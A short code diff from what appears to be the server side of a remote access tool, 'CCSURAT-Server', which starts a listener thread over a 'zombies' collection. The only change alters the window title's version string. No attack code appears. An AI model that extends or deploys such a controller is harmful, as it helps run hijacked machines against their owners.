@@ -26,7 +26,7 @@ namespace CCSURAT_Server
             listener = new Listener(this, zombies, listenPort);
             Thread thread = new Thread(new ThreadStart(listener.Listen));
             thread.Start();
-            this.Text = "CCSURAT-Server v" + Environment.Version;
+            this.Text = "CCSURAT-Server v" + Application.ProductVersion;
         }
 
         private void sendButton_Click(object sender, EventArgs e)
